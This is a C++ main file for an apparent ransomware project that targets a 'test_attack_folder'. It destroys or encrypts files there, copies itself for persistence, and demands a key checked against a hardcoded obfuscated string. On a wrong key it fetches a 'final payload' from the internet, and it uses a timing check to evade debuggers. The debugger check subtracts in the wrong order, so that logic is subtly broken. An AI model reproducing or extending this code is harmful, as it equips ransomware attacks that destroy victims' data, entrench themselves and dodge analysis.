#include "kill_switch.h"
#include "attack.h"
#include "misc.h"

Attack attack;
Misc misc;
wstring s2ws(const std::string& str);
string ws2s(const std::wstring& wstr);
void checkDbg();

int main()
{
	checkDbg();

	string pass_key;

	string attack_dir = misc.current_working_directory() + "/../../test_attack_folder";
	vector<wstring> files = attack.list_n_kill_files(s2ws(attack_dir));
	string res = ws2s((const std::wstring&)*files.data()); // convert files vector into wstring into string

	// if files contain the string txt, exploit was completed
	if (res.find("txt") != std::string::npos)
	{
		std::cout << "[+] Exploit completed" << std::endl << std::endl;

		// Start persistance 
		misc.CopyMyself();
	}

	std::cout << "[!] Enter key to decrypt files: " << std::endl;
	cin >> pass_key;

	// if password entered from victim equals the decrypted text of key below
	if (pass_key == encryptDecrypt("3S)R%!(&().G+Z9)&"))
	{
		std::cout << "[+] Your files are being decrypted" << std::endl;
		decrypt_files(s2ws(attack_dir));
	}
	else {
		std::cout << "[-] Wrong Password" << std::endl;
		// download final payload from github
		misc.CallFileFromInternet();
	}

	return 0;
}

// string to wstring conversion
wstring s2ws(const std::string& str)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.from_bytes(str);
}

// wstring to string conversion
string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}

static size_t checkDbg_size(size_t val)
{
	return val;
}

void checkDbg()
{
	DWORD time_a = GetTickCount();
	checkDbg_size(time_a);
	DWORD time_b = GetTickCount();

	DWORD delta = time_a - time_b;
	// if the amount of time it takes from point a to b is greater than a 26 tick count, then
	// user is in debug mode.
	if ((delta) > 0x1A)
	{
		std::cout << "Debugger detected.." << std::endl;
		exit(-1);
	}
}